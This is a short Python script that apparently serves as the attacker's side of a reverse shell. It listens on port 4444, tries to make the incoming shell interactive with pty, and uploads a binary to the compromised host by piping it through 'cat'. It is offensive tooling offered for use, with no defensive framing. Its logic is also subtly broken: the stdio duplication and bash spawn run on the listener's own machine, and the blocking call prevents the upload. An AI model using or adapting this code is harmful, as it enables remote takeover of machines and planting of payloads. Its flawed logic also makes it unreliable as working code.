import socket
import os
import pty
import time

def stabilize_shell(sock):
    # Duplicating socket file descriptors to stdin, stdout, and stderr
    os.dup2(sock.fileno(), 0)
    os.dup2(sock.fileno(), 1)
    os.dup2(sock.fileno(), 2)
    
    # Use the pty module to spawn a fully interactive TTY bash shell
    pty.spawn("/bin/bash")

def simulate_ctrl_d(sock):
    # Simulate Ctrl+D by sending EOF but keeping the connection alive
    sock.shutdown(socket.SHUT_WR)  # Send EOF to signal the end of transmission

def send_file(filename, sock):
    # Open the file in binary mode and send it in chunks
    sock.sendall(b"cat > hello\r")
    time.sleep(1)
    with open(filename, 'rb') as f:
        while True:
            data = f.read(1024)
            if not data:
                break
            sock.sendall(data)

    # Simulate Ctrl+D (EOF) after file transmission
    simulate_ctrl_d(sock)

def handle_reverse_shell_connection(host, port, filename):
    # Set up the server socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print(f"Listening for reverse shell connection on {host}:{port}...")

    # Accept the incoming reverse shell connection
    conn, addr = s.accept()
    print(f"Connection established with {addr}")

    # Stabilize the reverse shell
    stabilize_shell(conn)

    # Send the binary file to the client (over the stabilized shell)
    send_file(filename, conn)

    # Keep the connection alive for further interaction
    while True:
        try:
            response = conn.recv(1024)
            if not response:
                break
            print(response.decode())
        except KeyboardInterrupt:
            print("Exiting.")
            break

    # Close the connection when done
    conn.close()

# Example usage: listen for reverse shell on 4444 and send the "executable" binary
handle_reverse_shell_connection('0.0.0.0', 4444, 'hello')

